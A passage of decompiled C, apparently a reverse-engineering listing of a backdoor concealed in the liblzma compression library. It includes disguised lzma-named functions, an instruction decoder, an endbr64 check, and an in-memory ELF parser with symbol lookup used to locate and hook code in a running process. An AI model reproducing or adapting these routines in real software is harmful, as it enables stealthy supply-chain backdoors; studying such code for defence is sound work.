                  if (0x3e < (byte)(bVar12 + 0x7f)) goto LAB_00100324;
                }
                if ((uVar14 >> (uVar16 & 0x3f) & 1) != 0) {
                  pbVar11 = (byte *)0x4;
                }
              }
              else {
                uVar16 = 1L << (bVar12 + 0x3e & 0x3f);
                if ((uVar16 & 0x2000c800000020) == 0) {
                  if ((uVar16 & 0x101) != 0) {
                    pbVar11 = (byte *)0x2;
                  }
                }
                else {
                  pbVar11 = (byte *)0x4;
                }
              }
            }
LAB_00100324:
            *(byte *)((long)param_1 + 0x11) = *(byte *)((long)param_1 + 0x11) | 8;
            param_1[9] = pbVar11;
          }
          sVar6 = (sbyte)uVar13;
          pbVar11 = pbVar10;
          if (((int)(uint)(byte)(&DAT_0010ad80)[bVar12 >> 3] >> sVar6 & 1U) != 0) goto LAB_001008a5;
          if (3 < bVar12 - 0xa0) {
            if ((*(byte *)((long)param_1 + 0x11) & 8) != 0) {
              if ((((*(byte *)(param_1 + 2) & 0x20) != 0) &&
                  ((*(byte *)((long)param_1 + 0x1b) & 8) != 0)) && ((bVar12 & 0xf8) == 0xb8)) {
                param_1[9] = (byte *)0x8;
                *(byte *)((long)param_1 + 0x11) = *(byte *)((long)param_1 + 0x11) | 0x10;
                *(sbyte *)(param_1 + 4) = sVar6;
                *(undefined4 *)(param_1 + 5) = 0xb8;
              }
              goto LAB_0010065d;
            }
            *param_1 = param_2;
            pbVar10 = (byte *)(((long)pbVar10 - (long)param_2) + 1);
            goto LAB_001004c1;
          }
          *(byte *)((long)param_1 + 0x11) = *(byte *)((long)param_1 + 0x11) | 5;
LAB_0010063f:
          pbVar11 = pbVar10 + 1;
LAB_0010071c:
          if (((param_3 <= pbVar11) || (param_3 <= pbVar11 + 1)) || (param_3 <= pbVar11 + 2))
          goto LAB_00100a85;
          pbVar15 = pbVar11 + 3;
          if (param_3 <= pbVar15) goto LAB_00100a85;
          bVar12 = *(byte *)((long)param_1 + 0x11);
          param_1[6] = (byte *)(long)CONCAT13(pbVar11[3],
                                              CONCAT12(pbVar11[2],CONCAT11(pbVar11[1],*pbVar11)));
          if ((bVar12 & 4) == 0) {
            if ((bVar12 & 8) != 0) {
              pbVar10 = pbVar11 + 4;
              goto LAB_00100660;
            }
LAB_0010087f:
            *param_1 = param_2;
            pbVar10 = pbVar15 + (1 - (long)param_2);
          }
          else {
            if (((param_3 <= pbVar11 + 4) || (param_3 <= pbVar11 + 5)) ||
               ((param_3 <= pbVar11 + 6 || (param_3 <= pbVar11 + 7)))) goto LAB_00100a85;
            if ((bVar12 & 8) != 0) {
              pbVar10 = pbVar11 + 8;
              goto LAB_00100660;
            }
            *param_1 = param_2;
            pbVar10 = pbVar11 + 7 + (1 - (long)param_2);
          }
LAB_001007c4:
          param_1[1] = pbVar10;
        }
        if (pbVar10 == (byte *)0x0) {
          return 0;
        }
        uVar5 = *(uint *)(param_1 + 5);
LAB_001004ce:
        iVar4 = uVar5 + 0x80;
        goto LAB_001004d1;
      }
LAB_001000af:
      if ((*(byte *)(param_1 + 2) & 1) != 0) {
        return 0;
      }
      *(byte *)(param_1 + 2) = *(byte *)(param_1 + 2) | 1;
      *(byte *)((long)param_1 + 0x14) = *pbVar10;
    }
LAB_00100655:
    pbVar10 = pbVar10 + 1;
    bVar18 = pbVar10 < param_3;
  } while( true );
}



bool check_software_breakpoint(int *param_1,long param_2,uint param_3)

{
  bool bVar1;
  
  bVar1 = false;
  if (3 < param_2 - (long)param_1) {
    bVar1 = (param_3 | 0x5e20000) + *param_1 == 0xf223;
  }
  return bVar1;
}



undefined8 FUN_00100af0(ulong param_1,undefined8 param_2,ulong *param_3,int param_4)

{
  int iVar1;
  undefined8 uVar2;
  long lVar3;
  long *plVar4;
  long local_70;
  long local_68;
  int local_48;
  
  if (param_4 == 0) {
    uVar2 = 0;
    plVar4 = &local_70;
    for (lVar3 = 0x16; lVar3 != 0; lVar3 = lVar3 + -1) {
      *(undefined4 *)plVar4 = 0;
      plVar4 = (long *)((long)plVar4 + 4);
    }
    iVar1 = code_dasm(&local_70,param_1,param_2);
    if (((iVar1 != 0) && (local_48 == 3999)) && ((local_68 + local_70 & 0xfU) == 0)) {
      if (param_3 != (ulong *)0x0) {
        *param_3 = local_68 + local_70;
      }
      uVar2 = 1;
    }
  }
  else {
    uVar2 = check_software_breakpoint(param_1,param_2,0xe230);
    if ((int)uVar2 != 0) {
      if (param_3 != (ulong *)0x0) {
        *param_3 = param_1;
      }
      uVar2 = 1;
    }
  }
  return uVar2;
}



undefined8
apply_method_1(ulong param_1,ulong *param_2,ulong *param_3,ulong param_4,ulong param_5,
              undefined4 param_6)

{
  int iVar1;
  ulong uVar2;
  ulong local_40 [2];
  
  local_40[0] = 0;
  uVar2 = param_1;
  if (param_2 != (ulong *)0x0) {
    while ((param_4 < uVar2 && (iVar1 = FUN_00100af0(uVar2,param_5,local_40,param_6), iVar1 == 0)))
    {
      uVar2 = uVar2 - 1;
    }
    uVar2 = local_40[0];
    if ((local_40[0] == 0) ||
       ((local_40[0] == param_4 && (iVar1 = FUN_00100af0(param_4,param_5,0,param_6), iVar1 == 0))))
    {
      return 0;
    }
    *param_2 = uVar2;
  }
  param_1 = param_1 + 1;
  if (param_3 != (ulong *)0x0) {
    for (; param_1 < param_5 - 4; param_1 = param_1 + 1) {
      iVar1 = FUN_00100af0(param_1,param_5,0,param_6);
      if (iVar1 != 0) goto LAB_00100c58;
    }
    if ((param_5 - 4 != param_1) || (iVar1 = FUN_00100af0(param_1,param_5,0,param_6), iVar1 != 0)) {
LAB_00100c58:
      param_5 = param_1;
    }
    *param_3 = param_5;
  }
  return 1;
}



undefined8 _Llzma_optimum_normal_0(ulong param_1,ulong param_2,long param_3,long *param_4)

{
  int iVar1;
  long lVar2;
  long *plVar3;
  byte bVar4;
  long local_80 [12];
  
  bVar4 = 0;
  iVar1 = apply_one_entry_ex(0,0x81,4,7);
  if (iVar1 != 0) {
    plVar3 = local_80;
    for (lVar2 = 0x16; lVar2 != 0; lVar2 = lVar2 + -1) {
      *(undefined4 *)plVar3 = 0;
      plVar3 = (long *)((long)plVar3 + ((ulong)bVar4 * -2 + 1) * 4);
    }
    if (param_4 == (long *)0x0) {
      param_4 = local_80;
    }
    while (param_1 < param_2) {
      iVar1 = code_dasm(param_4,param_1,param_2);
      if (iVar1 == 0) {
        param_1 = param_1 + 1;
      }
      else {
        if ((*(int *)(param_4 + 5) == 0x168) &&
           ((param_3 == 0 || (param_4[1] + param_4[7] + *param_4 == param_3)))) {
          return 1;
        }
        param_1 = param_1 + param_4[1];
      }
    }
  }
  return 0;
}



undefined8
_Llzma_filters_update_0(ulong param_1,ulong param_2,uint param_3,int param_4,undefined4 *param_5)

{
  int iVar1;
  long lVar2;
  undefined4 *puVar3;
  bool bVar4;
  undefined4 local_80 [22];
  
  puVar3 = local_80;
  for (lVar2 = 0x16; lVar2 != 0; lVar2 = lVar2 + -1) {
    *puVar3 = 0;
    puVar3 = puVar3 + 1;
  }
  if (param_5 == (undefined4 *)0x0) {
    param_5 = local_80;
  }
  do {
    while( true ) {
      if (param_2 <= param_1) {
        return 0;
      }
      iVar1 = code_dasm(param_5,param_1,param_2);
      if (iVar1 != 0) break;
      param_1 = param_1 + 1;
    }
    if (((param_5[7] & 0xff00ff00) == 0x5000000) &&
       ((((*(byte *)((long)param_5 + 0x1b) & 0x48) == 0x48) == param_3 || (param_4 == 0)))) {
      iVar1 = param_5[10];
      if (iVar1 == 0x10d) {
        return 1;
      }
      if (param_4 == 0) {
        bVar4 = iVar1 == 0x109;
      }
      else {
        bVar4 = iVar1 == 0x10b;
      }
      if (bVar4) {
        return 1;
      }
    }
    param_1 = param_1 + *(long *)(param_5 + 2);
  } while( true );
}



undefined8
_Llzma_filters_update_1(ulong param_1,ulong param_2,uint param_3,int param_4,undefined4 *param_5)

{
  int iVar1;
  long lVar2;
  undefined4 *puVar3;
  bool bVar4;
  undefined4 local_80 [22];
  
  puVar3 = local_80;
  for (lVar2 = 0x16; lVar2 != 0; lVar2 = lVar2 + -1) {
    *puVar3 = 0;
    puVar3 = puVar3 + 1;
  }
  if (param_5 == (undefined4 *)0x0) {
    param_5 = local_80;
  }
  do {
    while( true ) {
      if (param_2 <= param_1) {
        return 0;
      }
      iVar1 = code_dasm(param_5,param_1,param_2);
      if (iVar1 != 0) break;
      param_1 = param_1 + 1;
    }
    if (((param_5[7] & 0xff00ff00) == 0x5000000) &&
       ((((*(byte *)((long)param_5 + 0x1b) & 0x48) == 0x48) == param_3 || (param_4 == 0)))) {
      if (param_4 == 0) {
        bVar4 = param_5[10] == 0x109;
      }
      else {
        bVar4 = param_5[10] == 0x10b;
      }
      if (bVar4) {
        return 1;
      }
    }
    param_1 = param_1 + *(long *)(param_5 + 2);
  } while( true );
}



undefined8 _Llzma_raw_encoder_0(ulong param_1,ulong param_2,long param_3)

{
  int iVar1;
  long lVar2;
  undefined4 *puVar3;
  byte bVar4;
  undefined4 local_80 [4];
  byte local_6f;
  int local_58;
  long local_50;
  
  bVar4 = 0;
  iVar1 = _Llzma_index_iter_rewind_cold(0x7c,5,6,0);
  if (iVar1 != 0) {
    puVar3 = local_80;
    for (lVar2 = 0x16; lVar2 != 0; lVar2 = lVar2 + -1) {
      *puVar3 = 0;
      puVar3 = puVar3 + (ulong)bVar4 * -2 + 1;
    }
    for (; param_1 < param_2; param_1 = param_1 + 1) {
      iVar1 = code_dasm(local_80,param_1,param_2);
      if ((((iVar1 != 0) && (local_58 == 0x10d)) && ((local_6f & 7) == 1)) &&
         ((local_50 == param_3 || (local_50 == -param_3)))) {
        return 1;
      }
    }
  }
  return 0;
}



undefined8 _Llzma_mt_block_size_1(ulong param_1,ulong param_2,long *param_3,long param_4)

{
  int iVar1;
  long lVar2;
  long *plVar3;
  byte bVar4;
  long local_80 [12];
  
  bVar4 = 0;
  iVar1 = _Llzma_index_iter_rewind_cold(0x1c8,0,0x1e,0);
  if (iVar1 != 0) {
    plVar3 = local_80;
    for (lVar2 = 0x16; lVar2 != 0; lVar2 = lVar2 + -1) {
      *(undefined4 *)plVar3 = 0;
      plVar3 = (long *)((long)plVar3 + ((ulong)bVar4 * -2 + 1) * 4);
    }
    if (param_3 == (long *)0x0) {
      param_3 = local_80;
    }
    for (; param_1 < param_2; param_1 = param_1 + 1) {
      iVar1 = code_dasm(param_3,param_1,param_2);
      if ((((iVar1 != 0) && (*(int *)(param_3 + 5) == 0x10d)) &&
          ((*(byte *)((long)param_3 + 0x1b) & 0x48) == 0x48)) &&
         (((*(uint *)((long)param_3 + 0x1c) & 0xff00ff00) == 0x5000000 &&
          ((param_4 == 0 || (param_3[1] + *param_3 + param_3[6] == param_4)))))) {
        return 1;
      }
    }
  }
  return 0;
}



undefined8 _Lstream_encode_1(undefined8 param_1,undefined8 param_2,undefined8 param_3)

{
  int iVar1;
  undefined8 uVar2;
  long lVar3;
  undefined8 *puVar4;
  undefined8 local_60 [12];
  
  puVar4 = local_60;
  for (lVar3 = 0x16; lVar3 != 0; lVar3 = lVar3 + -1) {
    *(undefined4 *)puVar4 = 0;
    puVar4 = (undefined8 *)((long)puVar4 + 4);
  }
  iVar1 = _Llzma_mt_block_size_1(param_1,param_2,local_60,param_3);
  uVar2 = 0;
  if (iVar1 != 0) {
    uVar2 = local_60[0];
  }
  return uVar2;
}



undefined8
_Llzma_properties_size_0(ulong param_1,ulong param_2,long *param_3,int param_4,long param_5)

{
  int iVar1;
  long lVar2;
  long *plVar3;
  byte bVar4;
  long local_80 [11];
  
  bVar4 = 0;
  iVar1 = _Llzma_index_iter_rewind_cold(0xd6,4,0xe,0);
  if (iVar1 != 0) {
    plVar3 = local_80;
    for (lVar2 = 0x16; lVar2 != 0; lVar2 = lVar2 + -1) {
      *(undefined4 *)plVar3 = 0;
      plVar3 = (long *)((long)plVar3 + ((ulong)bVar4 * -2 + 1) * 4);
    }
    if (param_3 == (long *)0x0) {
      param_3 = local_80;
    }
    for (; param_1 < param_2; param_1 = param_1 + 1) {
      iVar1 = code_dasm(param_3,param_1,param_2);
      if ((((iVar1 != 0) && (*(int *)(param_3 + 5) == param_4)) &&
          ((*(uint *)((long)param_3 + 0x1c) & 0xff00ff00) == 0x5000000)) &&
         ((param_5 == 0 ||
          (((*(byte *)((long)param_3 + 0x11) & 1) != 0 &&
           (param_5 == param_3[6] + *param_3 + param_3[1])))))) {
        return 1;
      }
    }
  }
  return 0;
}



undefined8
_Lstream_encoder_mt_init_1
          (undefined8 param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4)

{
  int iVar1;
  undefined8 uVar2;
  
  iVar1 = _Llzma_mt_block_size_1();
  if (iVar1 == 0) {
    uVar2 = _Llzma_properties_size_0(param_1,param_2,param_3,0x10b,param_4);
    return uVar2;
  }
  return 1;
}



undefined8 _Llzma_simple_x86_decoder_init_1(ulong param_1,ulong param_2,long *param_3,long param_4)

{
  int iVar1;
  long lVar2;
  long *plVar3;
  long local_80 [12];
  
  plVar3 = local_80;
  for (lVar2 = 0x16; lVar2 != 0; lVar2 = lVar2 + -1) {
    *(undefined4 *)plVar3 = 0;
    plVar3 = (long *)((long)plVar3 + 4);
  }
  if (param_3 == (long *)0x0) {
    param_3 = local_80;
  }
  while( true ) {
    if (param_2 <= param_1) {
      return 0;
    }
    iVar1 = code_dasm(param_3,param_1,param_2);
    if ((((iVar1 != 0) && (*(int *)(param_3 + 5) == 0x103)) &&
        ((*(uint *)((long)param_3 + 0x1c) & 0xff00ff00) == 0x5000000)) &&
       ((param_4 == 0 ||
        (((*(byte *)((long)param_3 + 0x11) & 1) != 0 &&
         (param_4 == param_3[6] + *param_3 + param_3[1])))))) break;
    param_1 = param_1 + 1;
  }
  return 1;
}



void fake_lzma_free(void)

{
  return;
}



ulong FUN_00101220(ulong *param_1,ulong param_2,long param_3,uint param_4,int param_5)

{
  int iVar1;
  int *piVar2;
  ulong uVar3;
  ulong uVar4;
  ulong uVar5;
  long lVar6;
  
LAB_00101234:
  param_5 = param_5 + 1;
  uVar3 = param_2 + param_3;
  if (param_3 == 0) {
LAB_0010136e:
    uVar3 = 1;
  }
  else {
    uVar4 = uVar3;
    if (param_2 <= uVar3) {
      uVar4 = param_2;
    }
    if ((*param_1 <= uVar4) && (param_5 != 0x3ea)) {
      lVar6 = 0;
      do {
        if ((uint)*(ushort *)(param_1 + 3) <= (uint)lVar6) break;
        piVar2 = (int *)(lVar6 * 0x38 + param_1[2]);
        if ((*piVar2 == 1) && ((piVar2[1] & param_4) == param_4)) {
          uVar4 = (*param_1 - param_1[1]) + *(long *)(piVar2 + 4);
          uVar5 = *(long *)(piVar2 + 10) + uVar4;
          uVar4 = uVar4 & 0xfffffffffffff000;
          if ((uVar5 & 0xfff) != 0) {
            uVar5 = (uVar5 & 0xfffffffffffff000) + 0x1000;
          }
          if ((param_2 >= uVar4) && (uVar3 <= uVar5)) goto LAB_0010136e;
          if ((uVar3 > uVar5) || (uVar4 <= param_2)) {
            if ((uVar5 <= param_2) || (param_2 < uVar4)) {
              if ((uVar5 < uVar3) && (uVar4 > param_2)) {
                uVar4 = FUN_00101220(param_1,param_2,uVar4 - param_2,param_4);
                if ((int)uVar4 == 0) {
                  return uVar4;
                }
                iVar1 = FUN_00101220(param_1,uVar5 + 1,(uVar3 - 1) - uVar5,param_4,param_5);
                return (ulong)(iVar1 != 0);
              }
            }
            else if (uVar5 < uVar3) {
              param_2 = uVar5 + 1;
              param_3 = uVar3 - param_2;
              goto LAB_00101234;
            }
          }
          else if (uVar4 < uVar3) goto code_r0x001012f3;
        }
        lVar6 = lVar6 + 1;
      } while( true );
    }
    uVar3 = 0;
  }
  return uVar3;
code_r0x001012f3:
  param_3 = (uVar4 - param_2) + -1;
  goto LAB_00101234;
}



void process_elf_seg(void)

{
  FUN_00101220();
  return;
}



bool is_gnu_relro(int param_1,int param_2)

{
  return param_1 + 1 + param_2 == 0x474e553;
}



undefined8 parse_elf(ulong param_1,ulong *param_2)

{
  uint uVar1;
  uint uVar2;
  uint uVar3;
  ulong uVar4;
  uint *puVar5;
  ulong uVar6;
  undefined auVar7 [16];
  undefined auVar8 [16];
  byte bVar9;
  bool bVar10;
  int iVar11;
  int iVar12;
  uint **ppuVar13;
  long lVar14;
  uint *puVar15;
  ulong *puVar16;
  int *piVar17;
  ulong uVar18;
  int *piVar19;
  ulong uVar20;
  uint uVar21;
  uint *puVar22;
  uint *puVar23;
  uint *puVar24;
  
  if (param_1 == 0) {
    return 0;
  }
  if (param_2 != (ulong *)0x0) {
    uVar18 = 0xffffffffffffffff;
    uVar21 = 0;
    puVar16 = param_2 + 1;
    for (lVar14 = 0x3e; lVar14 != 0; lVar14 = lVar14 + -1) {
      *(undefined4 *)puVar16 = 0;
      puVar16 = (ulong *)((long)puVar16 + 4);
    }
    *param_2 = param_1;
    lVar14 = -1;
    uVar20 = (ulong)*(ushort *)(param_1 + 0x38);
    piVar17 = (int *)(*(long *)(param_1 + 0x20) + param_1);
    *(ushort *)(param_2 + 3) = *(ushort *)(param_1 + 0x38);
    param_2[2] = (ulong)piVar17;
    piVar19 = piVar17;
    for (; uVar21 < (uint)uVar20; uVar21 = uVar21 + 1) {
      iVar11 = *piVar19;
      if (iVar11 == 1) {
        if (*(ulong *)(piVar19 + 4) < uVar18) {
          uVar18 = *(ulong *)(piVar19 + 4);
        }
      }
      else if (iVar11 == 2) {
        lVar14 = (long)(int)uVar21;
      }
      else {
        iVar11 = is_gnu_relro(iVar11,0xa0000000);
        if (iVar11 != 0) {
          if (*(int *)((long)param_2 + 0x4c) != 0) {
            return 0;
          }
          param_2[10] = *(ulong *)(piVar19 + 4);
          uVar4 = *(ulong *)(piVar19 + 10);
          *(undefined4 *)((long)param_2 + 0x4c) = 1;
          param_2[0xb] = uVar4;
        }
      }
      piVar19 = piVar19 + 0xe;
    }
    if ((uVar18 != 0xffffffffffffffff) && ((int)lVar14 != -1)) {
      param_2[1] = uVar18;
      uVar20 = *(ulong *)(piVar17 + lVar14 * 0xe + 10);
      uVar18 = (param_1 - uVar18) + *(long *)(piVar17 + lVar14 * 0xe + 4);
      param_2[4] = uVar18;
      iVar11 = (int)(uVar20 >> 4);
      *(int *)(param_2 + 5) = iVar11;
      iVar12 = process_elf_seg();
      if (iVar12 != 0) {
        ppuVar13 = (uint **)(uVar18 + 8);
        bVar10 = false;
        puVar22 = (uint *)0xffffffffffffffff;
        puVar23 = (uint *)0xffffffffffffffff;
        puVar15 = (uint *)0xffffffffffffffff;
        puVar24 = (uint *)0x0;
        for (iVar12 = 0; iVar11 != iVar12; iVar12 = iVar12 + 1) {
          puVar5 = ppuVar13[-1];
          if (puVar5 == (uint *)0x0) {
            *(int *)(param_2 + 5) = iVar12;
            break;
          }
          if ((long)puVar5 < 0x25) {
            if ((long)puVar5 < 0x17) {
              switch(puVar5) {
              case (uint *)0x2:
                puVar15 = *ppuVar13;
                break;
              case (uint *)0x5:
                param_2[6] = (ulong)*ppuVar13;
                break;
              case (uint *)0x6:
                param_2[7] = (ulong)*ppuVar13;
                break;
              case (uint *)0x7:
                param_2[0xf] = (ulong)*ppuVar13;
                break;
              case (uint *)0x8:
                puVar23 = *ppuVar13;
              }
            }
            else {
              switch(puVar5) {
              case (uint *)0x17:
                param_2[8] = (ulong)*ppuVar13;
                break;
              case (uint *)0x18:
                goto switchD_0010155d_caseD_18;
              case (uint *)0x1e:
                bVar9 = *(byte *)ppuVar13 & 8;
                goto LAB_00101630;
              case (uint *)0x23:
                puVar22 = *ppuVar13;
                break;
              case (uint *)0x24:
                param_2[0x11] = (ulong)*ppuVar13;
              }
            }
          }
          else if (puVar5 == (uint *)0x6ffffffb) {
            bVar9 = *(byte *)ppuVar13 & 1;
LAB_00101630:
            if (bVar9 != 0) {
switchD_0010155d_caseD_18:
              *(byte *)(param_2 + 0x1a) = *(byte *)(param_2 + 0x1a) | 0x20;
            }
          }
          else if ((long)puVar5 < 0x6ffffffc) {
            if ((long)puVar5 < 0x6ffffefd) {
              if (0x6ffffefa < (long)puVar5) {
                return 0;
              }
              if (puVar5 == (uint *)0x6ffffef5) {
                puVar24 = *ppuVar13;
              }
            }
            else if (puVar5 == (uint *)0x6ffffff0) {
              puVar5 = *ppuVar13;
              *(byte *)(param_2 + 0x1a) = *(byte *)(param_2 + 0x1a) | 0x10;
              param_2[0xe] = (ulong)puVar5;
            }
          }
          else if (puVar5 == (uint *)0x6ffffffd) {
            bVar10 = true;
            param_2[0xd] = (ulong)*ppuVar13;
          }
          else {
            if (puVar5 == (uint *)0x7fffffff) {
              return 0;
            }
            if (puVar5 == (uint *)0x6ffffffc) {
              param_2[0xc] = (ulong)*ppuVar13;
            }
          }
          ppuVar13 = ppuVar13 + 2;
        }
        uVar18 = param_2[8];
        if (uVar18 != 0) {
          if (puVar15 == (uint *)0xffffffffffffffff) {
            return 0;
          }
          *(byte *)(param_2 + 0x1a) = *(byte *)(param_2 + 0x1a) | 1;
          auVar7._8_8_ = 0;
          auVar7._0_8_ = puVar15;
          *(int *)(param_2 + 9) = SUB164(auVar7 / ZEXT816(0x18),0);
        }
        uVar20 = param_2[0xf];
        if (uVar20 != 0) {
          if (puVar23 == (uint *)0xffffffffffffffff) {
            return 0;
          }
          *(byte *)(param_2 + 0x1a) = *(byte *)(param_2 + 0x1a) | 2;
          auVar8._8_8_ = 0;
          auVar8._0_8_ = puVar23;
          *(int *)(param_2 + 0x10) = SUB164(auVar8 / ZEXT816(0x18),0);
        }
        uVar4 = param_2[0x11];
        if (uVar4 != 0) {
          if (puVar22 == (uint *)0xffffffffffffffff) {
            return 0;
          }
          *(byte *)(param_2 + 0x1a) = *(byte *)(param_2 + 0x1a) | 4;
          *(int *)(param_2 + 0x12) = (int)((ulong)puVar22 >> 3);
        }
        if (param_2[0xc] != 0) {
          if (bVar10) {
            *(byte *)(param_2 + 0x1a) = *(byte *)(param_2 + 0x1a) | 8;
          }
          else {
            param_2[0xc] = 0;
          }
        }
        uVar6 = param_2[6];
        if (((uVar6 != 0) && (puVar24 != (uint *)0x0)) && (param_2[7] != 0)) {
          if (uVar6 <= param_1) {
            param_2[6] = uVar6 + param_1;
            param_2[7] = param_2[7] + param_1;
            if (uVar18 != 0) {
              param_2[8] = uVar18 + param_1;
            }
            if (uVar20 != 0) {
              param_2[0xf] = uVar20 + param_1;
            }
            if (uVar4 != 0) {
              param_2[0x11] = uVar4 + param_1;
            }
            if (param_2[0xe] != 0) {
              param_2[0xe] = param_2[0xe] + param_1;
            }
            puVar24 = (uint *)((long)puVar24 + param_1);
          }
          uVar18 = param_2[0xc];
          if ((uVar18 != 0) && (uVar18 < param_1)) {
            param_2[0xc] = param_1 + uVar18;
          }
          if (((((param_2[8] == 0) ||
                (iVar11 = process_elf_seg(param_2,param_2[8],puVar15,4), iVar11 != 0)) &&
               ((param_2[0xf] == 0 ||
                (iVar11 = process_elf_seg(param_2,param_2[0xf],puVar23,4), iVar11 != 0)))) &&
              ((param_2[0x11] == 0 ||
               (iVar11 = process_elf_seg(param_2,param_2[0x11],puVar22,4), iVar11 != 0)))) &&
             ((param_2[0xc] == 0 ||
              (iVar11 = process_elf_seg(param_2,param_2[0xc],param_2[0xd] * 0x14,4), iVar11 != 0))))
          {
            uVar21 = *puVar24;
            *(uint *)(param_2 + 0x1b) = uVar21;
            uVar1 = puVar24[2];
            uVar2 = puVar24[1];
            *(uint *)((long)param_2 + 0xdc) = uVar1 - 1;
            puVar15 = puVar24 + 4;
            uVar3 = puVar24[3];
            param_2[0x1d] = (ulong)puVar15;
            *(uint *)(param_2 + 0x1c) = uVar3;
            param_2[0x1e] = (ulong)(puVar15 + uVar1 * 2);
            param_2[0x1f] = (ulong)(puVar15 + uVar1 * 2 + ((ulong)uVar21 - (ulong)uVar2));
            return 1;
          }
        }
      }
    }
  }
  return 0;
}



char * table_lookup_multi(long param_1,int param_2,int param_3)

{
  byte bVar1;
  ushort uVar2;
  uint uVar3;
  int iVar4;
  void *pvVar5;
  uint *puVar6;
  ulong uVar7;
  ushort *puVar8;
  short *psVar9;
  uint uVar10;
  byte *local_40;
  uint local_34;
  
  iVar4 = _Llzma_index_iter_rewind_cold(0x58,0xf,3,0);
  if ((iVar4 != 0) && ((param_3 == 0 || ((*(byte *)(param_1 + 0xd0) & 0x18) == 0x18)))) {
    for (uVar10 = 0; uVar10 < *(uint *)(param_1 + 0xd8); uVar10 = uVar10 + 1) {
      puVar6 = (uint *)(*(long *)(param_1 + 0xf0) + (ulong)uVar10 * 4);
      iVar4 = process_elf_seg(param_1,puVar6,4,4);
      if (iVar4 == 0) {
        return (char *)0x0;
      }
      local_40 = (byte *)(*(long *)(param_1 + 0xf8) + (ulong)*puVar6 * 4);
      iVar4 = process_elf_seg(param_1,local_40,8,4);
      if (iVar4 == 0) {
        return (char *)0x0;
      }
      do {
        uVar7 = (long)local_40 - *(long *)(param_1 + 0xf8) >> 2 & 0xffffffff;
        puVar6 = (uint *)(uVar7 * 0x18 + *(long *)(param_1 + 0x38));
        iVar4 = process_elf_seg(param_1,puVar6,0x18,4);
        if (iVar4 == 0) {
          return (char *)0x0;
        }
        if ((*(long *)(puVar6 + 2) != 0) && (*(short *)((long)puVar6 + 6) != 0)) {
          pvVar5 = (void *)((ulong)*puVar6 + *(long *)(param_1 + 0x30));
          iVar4 = process_elf_seg(param_1,pvVar5,1,4);
          if (iVar4 == 0) {
            return (char *)0x0;
          }
          iVar4 = table_get(pvVar5,(void *)0x0);
          if (iVar4 == param_2) {
            if (param_3 == 0) {
              return (char *)puVar6;
            }
            puVar8 = (ushort *)(uVar7 * 2 + *(long *)(param_1 + 0x70));
            iVar4 = process_elf_seg(param_1,puVar8,2,4);
            if (iVar4 == 0) {
              return (char *)0x0;
            }
            uVar2 = *puVar8;
            if (((*(byte *)(param_1 + 0xd0) & 0x18) == 0x18) && ((uVar2 & 0x7ffe) != 0)) {
              psVar9 = *(short **)(param_1 + 0x60);
              local_34 = 0;
              do {
                if (((*(ulong *)(param_1 + 0x68) <= (ulong)local_34) ||
                    (iVar4 = process_elf_seg(param_1,psVar9,0x14,4), iVar4 == 0)) || (*psVar9 != 1))
                break;
                if ((uVar2 & 0x7fff) == psVar9[2]) {
                  uVar3 = *(uint *)(psVar9 + 6);
                  iVar4 = process_elf_seg(param_1,(uint *)((ulong)uVar3 + (long)psVar9),8,4);
                  if (iVar4 == 0) break;
                  pvVar5 = (void *)((ulong)*(uint *)((ulong)uVar3 + (long)psVar9) +
                                   *(long *)(param_1 + 0x30));
                  iVar4 = process_elf_seg(param_1,pvVar5,1,4);
                  if (iVar4 == 0) break;
                  iVar4 = table_get(pvVar5,(void *)0x0);
                  if (param_3 == iVar4) {
                    return (char *)puVar6;
                  }
                }
                if (*(uint *)(psVar9 + 8) == 0) break;
                local_34 = local_34 + 1;
                psVar9 = (short *)((long)psVar9 + (ulong)*(uint *)(psVar9 + 8));
              } while( true );
            }
          }
        }
        bVar1 = *local_40;
        local_40 = local_40 + 4;
      } while ((bVar1 & 1) == 0);
    }
  }
  return (char *)0x0;
}



char * table_lookup_ex(long *param_1,undefined8 param_2)

{
  char *s;
  
  s = table_lookup_multi((long)param_1,(int)param_2,0);
  if (s != (char *)0x0) {
                    // If (s[6] == 0 && s[7] == 0) || (s[8] == 0 && ... && s[15] == 0)
    if ((*(long *)(s + 8) == 0) || (*(short *)(s + 6) == 0)) {
      s = (char *)0x0;
    }
    else {
      s = (char *)(*param_1 + *(long *)(s + 8));
    }
  }
  return s;
}



void * memmove(byte *dst,byte *src,long n)

{
  long lVar1;
  long sVar1;
  
  if ((src < dst) && (dst < src + n)) {
    lVar1 = n + -1;
    if (n != 0) {
      do {
        dst[lVar1] = src[lVar1];
        lVar1 = lVar1 + -1;
      } while (lVar1 != -1);
      return dst;
    }
  }
  else {
    sVar1 = 0;
    if (n == 0) {
      return dst;
    }
    do {
      dst[sVar1] = src[sVar1];
      sVar1 = sVar1 + 1;
    } while (n != sVar1);
  }
  return dst;
}



void fake_lzma_allocator(long *param_1,undefined8 param_2,uint param_3)

{
  table_lookup_ex(param_1,(ulong)param_3);
  return;
}



ulong _Lstream_encoder_update_0
                (long *param_1,long param_2,ulong param_3,ulong param_4,ulong *param_5)

{
  long lVar1;
  ulong uVar2;
  long *plVar3;
  ulong uVar4;
  
  if (((*(byte *)(param_1 + 0x1a) & 2) == 0) || (*(uint *)(param_1 + 0x10) == 0)) {
    return 0;
  }
  uVar4 = 0;
  if (param_5 != (ulong *)0x0) {
    uVar4 = *param_5;
  }
  lVar1 = *param_1;
  do {
    if (*(uint *)(param_1 + 0x10) <= uVar4) {
      if (param_5 != (ulong *)0x0) {
        *param_5 = uVar4;
      }
      return 0;
    }
    plVar3 = (long *)(uVar4 * 0x18 + param_1[0xf]);
    if (*(int *)(plVar3 + 1) == 8) {
      if (param_2 == 0) {
        uVar2 = plVar3[2] + lVar1;
      }
      else {
        if (plVar3[2] != param_2 - lVar1) goto LAB_00101be7;
        uVar2 = *plVar3 + lVar1;
        if (param_3 == 0) goto LAB_00101bf8;
      }
      if ((param_3 <= uVar2) && (uVar2 <= param_4)) {
LAB_00101bf8:
        if (param_5 == (ulong *)0x0) {
          return uVar2;
        }
        *param_5 = uVar4 + 1;
        return uVar2;
      }
    }
LAB_00101be7:
    uVar4 = uVar4 + 1;
  } while( true );
}



long * _Lstream_encoder_update_1
                 (long *param_1,long param_2,long *param_3,long *param_4,ulong *param_5)

{
  uint uVar1;
  long lVar2;
  int iVar3;
  ulong uVar4;
  long *plVar5;
  long lVar6;
  ulong uVar7;
  
  lVar2 = *param_1;
  if ((*(byte *)(param_1 + 0x1a) & 4) != 0) {
    uVar1 = *(uint *)(param_1 + 0x12);
